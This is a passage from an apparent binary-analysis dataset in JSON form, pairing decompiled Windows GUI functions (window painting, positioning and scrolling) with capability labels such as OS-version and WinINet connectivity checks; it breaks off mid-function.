        "decompiled_code": "\nvoid __fastcall fcn.00455cc4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint arg_ch;\n    uint arg_10h;\n    uchar auStack28 [16];\n    \n    fcn.00431640();\n    cVar1 = fcn.00431748();\n    if (((cVar1 == '\\0') || (in_EAX[0xc] == 0)) || ((*(in_EAX + 0x52) & 4) == 0)) {\n        if ((*(in_EAX + 0x90) == '\\0') || (*(param_2 + 4) == *(param_2 + 8))) {\n            uVar2 = fcn.00424860();\n            (**(*in_EAX + 0x44))(uVar2);\n            sub.user32.dll_FillRect(*(param_2 + 4), auStack28);\n        }\n    }\n    else if (*(in_EAX[0xc] + 0x240) == '\\0') {\n        arg_10h = 0;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.00457a28();\n        fcn.00431848(uVar2, arg_ch, arg_10h);\n    }\n    else {\n        fcn.0044ca1c();\n    }\n    *(param_2 + 0xc) = 1;\n    return;\n}\n",
        "token_count": 327
    },
    "00456294": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456294(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00418378();\n    iVar1 = fcn.00450f7c(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1e2) != 0)) {\n        (**(in_EAX + 0x1e0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "004562e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004562e4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ea) != 0) {\n        (**(in_EAX + 0x1e8))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00456414": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456414(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.00457a28();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x202) != 0) {\n        (**(in_EAX + 0x200))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00456470": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00456470(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004563dc();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.004197d8();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 144
    },
    "00456550": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456550(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4565f8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1dc)) && (*(in_EAX + 0x1dc) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.0044d5d0();\n        if (param_2 == '\\0') {\n            fcn.00404640();\n            *(in_EAX + 0x1ac) = 0;\n            fcn.004070f8();\n        }\n        else {\n            if (*(in_EAX + 0x1ac) == 0) {\n                uVar1 = fcn.00404610();\n                *(in_EAX + 0x1ac) = uVar1;\n            }\n            fcn.0040483c();\n            fcn.00407110();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4565ff;\n    uStack28 = 0x4565f7;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 352
    },
    "00456608": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456608(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x4c);\n        uStack24 = *(iVar1 + 0x50);\n        uStack20 = *(iVar1 + 0x54);\n        uStack16 = *(iVar1 + 0x58);\n        uStack44 = 2;\n        puStack48 = &fcn.00456608::var_18h;\n        uStack52 = 0x456642;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.00457a28();\n        uStack56 = 0;\n        puStack60 = 0x45664a;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x456652;\n        fcn.00453634();\n        uStack64 = 0x4566cb;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.0040483c();\n        if ((*(var_4h + 0x1db) != '\\0') && (*(var_4h + 0x1b0) != 0)) {\n            (**(**(var_4h + 0x1b0) + 0x18))(*(*(var_8h + 4) + 0x60));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x4566d2;\n        uStack64 = 0x4566ca;\n        fcn.0045363c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 521
    },
    "004566f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004566f8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 0xc) = 0;\n    if ((*(in_EAX + 0x1db) != '\\0') && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x28))();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00456720": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00456720(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x456735;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x45673f;\n    iVar3 = fcn.00404518();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x45678b;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0040483c();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x45679c;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x45678a;\n            fcn.0044ff28();\n        }\n        return;\n    }\n    puStack24 = 0x45679c;\n    fcn.004521dc();\n    return;\n}\n",
        "token_count": 289
    },
    "004567d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004567d0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    int32_t iStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043b1a8();\n    if ((iVar3 != 0) && (in_EAX != iVar3)) {\n        if (*(iVar3 + 0x275) != '\\0') {\n            cVar1 = fcn.004567d0();\n            if (cVar1 != '\\0') goto code_r0x0045686e;\n        }\n        if (*(iVar3 + 0x30) != 0) {\n            iStack20 = fcn.0043b1a8();\n            if (((iStack20 != 0) && (iVar3 != iStack20)) && (*(iStack20 + 0x275) != '\\0')) {\n                cVar1 = fcn.004567d0();\n                if (cVar1 != '\\0') goto code_r0x0045686e;\n            }\n        }\n    }\n    uVar2 = fcn.0043b068();\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040483c(uVar2);\n        if (*(param_2 + 4) == 0) goto code_r0x0045686e;\n    }\n    uVar4 = 0;\ncode_r0x0045686e:\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 385
    },
    "004568fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004568fc(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043b1a8();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar1 = fcn.004568fc();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x0045695c;\n    }\n    uVar2 = fcn.0043b068();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040483c();\n        if (*(param_2 + 4) == 0) goto code_r0x0045695c;\n    }\n    uVar4 = 0;\ncode_r0x0045695c:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 304
    },
    "004569c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004569c4(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043b1a8();\n    uStack20 = param_1;\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar2 = fcn.004569c4();\n        if (cVar2 != '\\0') goto code_r0x00456a22;\n    }\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        uVar1 = *(param_2 + 4);\n        uStack20 = param_1 & 0xffffff00 | uVar1;\n        fcn.0040483c();\n        *(param_2 + 4) = uVar1;\n        if (*(param_2 + 4) == '\\0') goto code_r0x00456a22;\n    }\n    uVar4 = 0;\ncode_r0x00456a22:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 320
    },
    "00456c1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00456c1c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0x19] == 0) {\n        iVar1 = fcn.0044fc34();\n        if (iVar1 < 1) {\n            iVar1 = fcn.0040aac0();\n            in_EAX[0x19] = iVar1;\n        }\n        else {\n            iVar1 = fcn.0040aaa0();\n            in_EAX[0x19] = iVar1;\n            fcn.0040aab4();\n            fcn.0044fc44();\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    fcn.00458d60();\n    return;\n}\n",
        "token_count": 171
    },
    "00456c9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456c9c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 106
    },
    "00456cc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00456cc0(uint param_1, uint8_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = fcn.0044ed30();\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar3 = fcn.00453b18();\n        iVar3 = iVar3 + -1;\n        if (-1 < iVar3) {\n            do {\n                if ((param_2 & uVar2) != 0) break;\n                fcn.00453adc();\n                uVar1 = fcn.0040483c();\n                uVar2 = uVar2 & 0xffffff00 | uVar2 | uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != -1);\n        }\n    }\n    return CONCAT14(param_2, uVar2);\n}\n",
        "token_count": 219
    },
    "00456d74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456d74(uint param_1, int32_t param_2)\n\n{\n    fcn.00451f94();\n    if ((*(*0x492b04 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.00454420();\n    }\n    fcn.00453ba8();\n    return;\n}\n",
        "token_count": 88
    },
    "00456e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00456e8c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x57) == '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.00453894();\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || ((*(in_EAX + 0x51) & 4) != 0)) {\n        fcn.004545e8();\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00457010": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457010(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x50) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            iVar2 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x1b4));\n            if (iVar2 != 0) {\n                fcn.0045792c();\n            }\n        }\n    }\n    fcn.00453ba8();\n    return;\n}\n",
        "token_count": 157
    },
    "00457154": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00457154(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uStack20;\n    \n    uVar1 = uStack20;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (in_EAX != 0) {\n            do {\n                iVar3 = fcn.0040483c();\n                if ((iVar3 != 0) && (*(iVar3 + 0x38) != 0)) {\n                    cVar2 = fcn.0040483c();\n                    if (cVar2 != '\\0') goto code_r0x004571df;\n                }\n                in_EAX = *(in_EAX + 0x30);\n            } while (in_EAX != 0);\n        }\n        iVar3 = fcn.0043b1a8();\n        if (iVar3 != 0) {\n            cVar2 = fcn.0040483c();\n            if (cVar2 != '\\0') goto code_r0x004571df;\n        }\n    }\n    iVar3 = fcn.0044c7b0();\n    if (iVar3 == 0) {\n        uStack20 = uVar1 & 0xffffff00;\n    }\ncode_r0x004571df:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 352
    },
    "004575d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004575d4(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x1b4);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x1b4), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.00453b18();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.00453adc();\n            cVar2 = fcn.004047cc();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x1b4) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x1b4);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.0045365c();\n    return;\n}\n",
        "token_count": 386
    },
    "004576c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004576c4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x1cc);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.00419834();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1d0) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.004196cc();\n                fcn.00419854();\n            }\n        }\n        if (*(in_EAX + 0x1b4) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x1d0) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.004197d8();\n                uVar3 = fcn.00457a28();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.004197d8();\n                uVar3 = fcn.00457a28();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x1b4), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "00457a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457a04(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x6d] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.00457a04();\n        }\n        (**(*in_EAX + 0x98))();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00457d34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00457d34(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x1b4) != 0;\n}\n",
        "token_count": 51
    },
    "00457e58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457e58(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x457e7a;\n    iVar2 = fcn.00404610();\n    uStack44 = 0x457f4e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040483c();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.00419834();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.004197d8();\n            cVar1 = fcn.0040483c();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1d8) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x457f55;\n    uStack44 = 0x457f4d;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 567
    },
    "00458020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458020(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    if ((*(in_EAX + 0x52) & 0x10) != 0) {\n        iVar1 = *(in_EAX[0x1e] + 8) + *(in_EAX[0x1e] + 0x10);\n        if (0 < *in_EDX) {\n            *in_EDX = *in_EDX + iVar1;\n        }\n        if (iVar1 <= *arg_ch) {\n            *arg_ch = *arg_ch - iVar1;\n        }\n        iVar1 = *(in_EAX[0x1e] + 0xc) + *(in_EAX[0x1e] + 0x14);\n        if (0 < *in_ECX) {\n            *in_ECX = *in_ECX + iVar1;\n        }\n        if (iVar1 <= *arg_8h) {\n            *arg_8h = *arg_8h - iVar1;\n        }\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 516
    },
    "004580e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004580e4(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_5ah;\n    int32_t var_56h;\n    int32_t var_52h;\n    char var_4eh;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00457d34();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.00453b18(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x90))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_ch = (**(*in_EAX[0x1e] + 0x10))();\n            var_ch = var_ch - (var_56h - lprc);\n            var_10h = (**(*in_EAX[0x1e] + 0x10))();\n            var_10h = var_10h - (var_52h - var_5ah);\n            var_14h = (**(*in_EAX[0x1e] + 0x10))();\n            var_14h = var_14h - (var_56h - lprc);\n            var_18h = (**(*in_EAX[0x1e] + 0x10))();\n            var_18h = var_18h - (var_52h - var_5ah);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - 